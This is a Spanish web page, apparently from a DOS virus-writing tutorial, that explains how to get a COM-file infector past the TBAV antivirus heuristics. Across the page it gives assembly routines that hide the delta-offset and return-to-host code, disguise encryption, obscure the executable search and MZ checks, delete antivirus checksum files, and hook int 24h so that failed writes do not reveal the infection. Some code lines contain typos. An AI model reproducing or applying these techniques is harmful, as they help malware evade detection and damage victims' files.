<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="GENERATOR" content="Mozilla/4.51 [en] (Win98; I) [Netscape]">
   <title> nEUrOtIc cpU. (Depurando el programilla.)</title>
</head>
<body text="#000000" bgcolor="#FFFFFF" link="#0000FF" vlink="#551A8B" alink="#FF0000">

<pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bueno ,he estado evitando hasta ahora hablar de heur&iacute;stica, pero
supongo que &eacute;s inevitable.
La busqueda heur&iacute;stica es un m&eacute;todo utilizado por lo antivirus
y consiste en buscar trozos muy utilizados en los virus.
Por ejemplo la busqueda del desplazamiento de las variables
(o delta offset o beta offset como dir&iacute;an algunos programadores
de virus).Ese trozo es muy com&uacute;n en los virus y en cambio
ning&uacute;n programa (normalmente) lo utiliza (&iquest;qu&eacute; programa necesita
buscar un desplazamiento de variables si no se va a cambiar
de offset?).
En nuestro programita saltar&iacute;an por ejemplo el flag de encriptaci&oacute;n
(flag # en el tbav) ,el flag de busqueda de ejecutables(porque
buscamos archivos com, eso quieras o no es bastante sospechoso)
,el flag de busqueda del delta offset (flag E en el tbav) y el
flag de regreso al hoste (salta cuando damos el control al hoste
saltando al offset 100h,flag B en el tbav)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Lista de flags del tbav
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------------------

E Flexible Entry-point.&nbsp; The code seems to be designed to be linked
&nbsp; on any location within an executable file.&nbsp; Common for viruses.
J Suspicious jump construct.&nbsp; Entry point via chained or indirect
&nbsp; jumps.&nbsp; This is unusual for normal software but common for viruses.
B Back to entry point.&nbsp; Contains code to re-start the program after
&nbsp; modifications at the entry-point are made.&nbsp; Very usual for viruses.
M Memory resident code.&nbsp; The program might stay resident in memory.
c No checksum / recovery information (Anti-Vir.Dat) available.
C The checksum data does not match!&nbsp; File has been changed!
T Incorrect timestamp.&nbsp; Some viruses use this to mark infected files.
Z EXE/COM determination.&nbsp; The program tries to check whether a file
&nbsp; is a COM or EXE file.&nbsp; Viruses need to do this to infect a program.
@ Encountered instructions which are not likely to be generated by
&nbsp; an assembler, but by some code generator like a polymorphic virus.
G Garbage instructions.&nbsp; Contains code that seems to have no purpose
&nbsp; other than encryption or avoiding recognition by virus scanners.
U Undocumented interrupt/DOS call.&nbsp; The program might be just tricky
&nbsp; but can also be a virus using a non-standard way to detect itself.
K Unusual stack.&nbsp; The program has a suspicious stack or an odd stack.
1 Found instructions which require a 80186 processor or above.
R Relocator.&nbsp; Program code will be relocated in a suspicious way.
L The program traps the loading of software.&nbsp; Might be a
&nbsp; virus that intercepts program load to infect the software.
w The program contains a MS-Windows or OS/2 exe-header.
F Suspicious file access.&nbsp; Might be able to infect a file.
S Contains a routine to search for executable (.COM or .EXE) files.
# Found a code decryption routine or debugger trap.&nbsp; This is common
&nbsp; for viruses but also for some copy-protected software.
D Disk write access.&nbsp; The program writes to disk without using DOS.
? Inconsistent exe-header.&nbsp; Might be a virus but can also be a bug.
N Wrong name extension. Extension conflicts with program structure.

&nbsp; Si os fij&aacute;is algunos de los flags son una chorada (ojo al flag w)
&nbsp; Pero tranquilos ,en esta vida todo tiene soluci&oacute;n en primer
&nbsp; lugar prodr&iacute;amos sustituir la tipica rutina ...
&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call find_offset
find_offset:&nbsp;&nbsp;&nbsp; pop&nbsp; bp
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp; bp,offset find_offset

&nbsp; ... por una rutina en la que leamos directamente de la pila

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call find_offset
find_offset:&nbsp;&nbsp;&nbsp; mov&nbsp; si,sp
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; bp,word&nbsp; ptr ss:[si]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sub&nbsp; bp,offset find_offset
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp; sp,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;adi&oacute;s flag E


&nbsp; Fijate que los datos en la pila se almacenan decrecientemente, con lo
&nbsp; que el &uacute;ltimo elemento est&aacute;&nbsp; en la posici&oacute;n de memoria m&aacute;s baja.
&nbsp; El &uacute;ltimo elemento de la pila lo apunta el par de registros ss:sp
&nbsp; No podemos direccionar la memoria con el registro sp por lo que primero
&nbsp; pasamos el valor de sp a si (mov si,sp) despu&eacute;s leemos el valor apuntado
&nbsp; por si y lo llevamos a bp(&eacute;sta &eacute;s la direcci&oacute;n apilada con el call)
&nbsp; Y bueno realizamos el sub y ojo a esta parte sumamos 2 al registro sp
&nbsp; ya que hemos desapilado una palabra de la pila y ahora el &uacute;ltimo elemento
&nbsp; de la pila est&aacute;&nbsp; dos posiciones hacia arriba.
&nbsp; Esta rutina sirve pero ten en cuenta que el call find_offset no puede
&nbsp; ser el primer comando del virus (sino la heur&iacute;stica saltar&iacute;a).
&nbsp; Antes del call find_offset podr&iacute;as poner ...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push cs
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push cs
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; ds
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; es
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ....ya que de todas formas lo tendr&iacute;as que poner.

&nbsp; No tengas tentaciones de poner instrucciones in&uacute;tiles antes del
&nbsp; call como&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; cx,cx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xchg ax,ax

&nbsp;Entonces no saltar&iacute;a el flag del delta offset
&nbsp;sin&oacute; el flag de garbage instruccion (instrucciones basura)
&nbsp;&iquest;qu&eacute; porqu&eacute; salta la heur&iacute;stica con instrucciones in&uacute;tiles?
&nbsp;Pues porque un programa normal no suele utilizarlas , no s&oacute;n instrucciones
&nbsp;que un compilador genere. En cambio los virus las utilizan para modificar
&nbsp;la rutina de desencriptaci&oacute;n en virus Polim&oacute;rficos. As&iacute; que evita
&nbsp;utilizarlas.
&nbsp;Ahora que hemos evitado el flag E vamos a anular el flag B (back to
&nbsp;entry point, regreso al punto de entrada).Salta cuando damos
&nbsp;el control al com despu&eacute;s de la ejecuci&oacute;n del virus.
&nbsp;Es decir si utilizamos ....

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,100h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp; ax

&nbsp;pero esto tiene una soluci&oacute;n tambi&eacute;n dr&aacute;stica,(no utilizaremos un mov)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp; 100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;apilamos el valor 100h en la pila
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;desapilamos ese valor en el registro ax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;saltamos a la direcci&oacute;n 100h&nbsp;

&nbsp; Si, si, s&eacute; lo que est&aacute;is pensando.Pero se v&eacute; que a los creadores
&nbsp; de antivirus no se les ocurri&oacute; :>
&nbsp; Je,Je hemos aniquilado otro flag. Vamos a por el siguiente.
&nbsp;&iquest;Qu&eacute; tal el flag de encriptaci&oacute;n?. La verdad es que &eacute;ste me costo un
&nbsp; poquito. Le&iacute; por alg&uacute;n sitio que poniendo despu&eacute;s de la rutina de
&nbsp; desencriptaci&oacute;n un comando de salida al DOS se quitaba,con lo que&nbsp;
&nbsp; el programa&nbsp; antivirus se pensaba que la zona encriptada eran datos&nbsp;
&nbsp; del programa&nbsp; Algo as&iacute; :>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cx,zona_encrypt&nbsp; ;en cx el numero de bytes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; di,di&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;a encriptar
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ax,byte ptr [valor]
mas:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte ptr [zona_start+di],ax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; di
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dec&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mas
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sigue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;salto para ejecutar el virus
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;ya desencriptado
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ax,4c00h&nbsp;&nbsp;&nbsp;&nbsp; ;para salir al DOS pero
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;nunca llega a ejecutarse
sigue:

***************** aqu&iacute; empieza el c&oacute;digo encriptado **********
zona_start:&nbsp;&nbsp;&nbsp; cld&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; cx,3d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; di,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; si,bp+cab_ORIG&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rep&nbsp;&nbsp;&nbsp; movsb
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .

&nbsp;&nbsp;&nbsp; La verdad es que es una idea ingeniosa ,pero no me funcion&oacute;.
&nbsp;&nbsp;&nbsp; As&iacute; que al final consegu&iacute; evitar el dichoso flag encriptando
&nbsp;&nbsp;&nbsp; y desencriptando el virus (parece parad&oacute;gico ,evitar el flag
&nbsp;&nbsp;&nbsp; de encriptaci&oacute;n con una rutina de encriptaci&oacute;n juajuajuajua)
&nbsp;&nbsp;&nbsp; Encripto y desencripto con una funci&oacute;n xor y utilizando un
&nbsp;&nbsp;&nbsp; valor fijo. Estas dos rutinas las ejecuto antes de llegar
&nbsp;&nbsp;&nbsp; a la verdadera rutina.Y estar&aacute;n en cada archivo.
&nbsp;&nbsp;&nbsp; La estructura del com quedar&iacute;a as&iacute;:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Busqueda del delta offset
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Encripto el virus con un valor fijo
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Desencripto el virus con el mismo valor
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Desencripto el virus con un valor variable que
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; se encuentra almacenado en el codigo.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Codigo del virus encriptado aqu&iacute;

&nbsp;&nbsp;&nbsp; Pod&eacute;is revisar el Tarazona_Killer en la zona de virus comentados
&nbsp;&nbsp;&nbsp; que est&aacute; en esta web (si ten&eacute;is m&aacute;s dudas).

&nbsp;&nbsp;&nbsp; Otro menos, esto va disminuyendo.Vamos ahora a por el flag S
&nbsp;&nbsp;&nbsp; Que salta con las rutinas de busqueda de archivos ejecutables
&nbsp;&nbsp;&nbsp; (exe,com).
&nbsp;&nbsp;&nbsp; Tambi&eacute;n hay una f&aacute;cil soluci&oacute;n.En vez de buscar archivos
&nbsp;&nbsp;&nbsp; *.com buscar archivos que cumplan *.c?m .
&nbsp;&nbsp;&nbsp; Y despu&eacute;s verificar si el caracter del medio es una o.
&nbsp;&nbsp;&nbsp; F&aacute;cil.El flag Z tiene una soluci&oacute;n parecida.
&nbsp;&nbsp;&nbsp; El flag z salta con rutinas de verificaci&oacute;n si un archivo
&nbsp;&nbsp;&nbsp; es com o exe (es decir comprobando si los 2 primeros bytes
&nbsp;&nbsp;&nbsp; son MZ).
&nbsp;&nbsp;&nbsp; Por ejemplo saltar&iacute;a con rutinas como:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp word ptr [cab_ORIG],'ZM'
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne contamina_com
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp salir
contamina_com:

NOTA: F&iacute;jate que para verificar si los 2 primeros bytes son MZ
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; comparamos con la cadena ZM ya que el bytes menos significativo
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; se carga m&aacute;s hacia la derecha y el menos significativo a la
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; izquierda.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Para evitar el flag leemos primero un byte y luego otro

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp byte ptr [cab_ORIG].'M'
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne contamina_com
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmp byte ptr [cab_ORIG+1],'Z'
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jne contamina_com
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp salir
contamina_com:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Bueno a estas alturas s&oacute;lo saltar&iacute;a el flag c
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C The checksum data does not match!&nbsp; File has been changed!
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; El Tbav crea un archivo en cada directorio con infomaci&oacute;n
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sobre los archivos ejecutables que hay en &eacute;l. Gracias a este
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; archivo el Tbav sabe si un archivo a aumentado de tama&ntilde;o o
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; qu&eacute;, (bueno no suelen engordar as&iacute; por as&iacute; los ejecutables
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; por lo que si uno crece de tama&ntilde;o lo m&aacute;s normal es que tenga
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; un virus&nbsp; :> )
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; La manera de evitar este flag es borrar el archivito con
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lo que de paso puedes borrar otros archivos de verificaci&oacute;n
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; de otros antivirus como el chklist.ms etc.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &iquest;qu&eacute; c&oacute;mo los borras? pues co&ntilde;o pa eso tienes la lista de
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; interrupciones int 21 en AH->41h y en DS:DX->asciz file

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Olvid&eacute;monos un poco de los flags y de la heur&iacute;stica ,por
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lo menos hasta que llegemos a la residencia ;>. Y vamos
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a deperurar un poco m&aacute;s el programilla.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Piensa por un momente lo que pasar&iacute;a si alguien copia
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nuestro virus a un diskette ,luego lo protege contra
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; escritura y despu&eacute;s ejecuta el virus.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pues aparecer&iacute;a en pantalla un horroroso mensaje de

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fallo de escritura en unidad A
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Anular, Reintentar, Ignorar?

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Incluso a veces aparece en pantalla error en int 24 :>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y vosotros no quer&eacute;is que eso pase ,porque delatar&iacute;a
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a nuestro peque&ntilde;o virus.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Pues bueno como todo en esta vida tiene una soluci&oacute;n.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; La interrupci&oacute;n 24 es la que gestiona los errores
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cr&iacute;ticos. Entre ellos est&aacute;&nbsp; la lectura en diskettes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; defectuosos, la escritura en diskettes protegidos
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contra escritura etc.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Las interrupciones s&oacute;n procedimientos que se ejecutan
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cuando se produce alg&uacute;n evento en el sistema ya sea
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; apretar una tecla ,mover el rat&oacute;n, o que aparezca un
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; error cr&iacute;tico.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; El DOS crea a partir de la direcci&oacute;n de memoria 0000:0000
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; una tabla que indica la direcci&oacute;n de inicio de cada
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; interrupci&oacute;n del sistema. S&oacute;lo hemos de leer la direcci&oacute;n
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; de la interrupci&oacute;n 24. Guardarla en una variable . Cambiar
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la direcci&oacute;n a un procedimiento nuestro que no devuelva
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; codigos de error y luego cuando ya hallamos contaminado
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; devolver a la interrupci&oacute;n 24 su direcci&oacute;n inicial.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (fijaos en la funci&oacute;n 35h y 25h de la int 21h, para leer
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; la direcci&oacute;n de una interrupci&oacute;n y para cambiarla)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,3524h&nbsp;&nbsp;&nbsp; ;en ah el codigo de la funci&oacute;n (35h)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;en al el n&uacute;mero de la interrupci&oacute;n

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Esto devuelve en BX el offset y en ES el segmento de la interrupci&oacute;n

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; cs:[bp+old_int24_off],bx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; cx:[bp+old_int24_seg],es

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Con esto guardo en memoria la direcci&oacute;n de la interruci&oacute;n original
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y ahora desv&iacute;o la interrupci&oacute;n 24 a un procedimiento m&iacute;o.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; dx,offset new_int24
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp; ax,2524h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;en ds:dx direcci&oacute;n de la nueva funci&oacute;n
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp; Contaminar&nbsp; ;supongo ds = cs ya que estamos contaminando com's
new_int24:&nbsp; xor&nbsp; al,al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;en al la interrupci&oacute;n 24 devuelve el c&oacute;digo
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; iret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;de error por lo que la pongo a 0 :>
contaminar:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Despu&eacute;s de contaminar simplemente devolvemos el valor original
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a la interrupci&oacute;n con...

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lds&nbsp;&nbsp; dx,cs:old_int24
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp; ax,2524h
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp; 21h

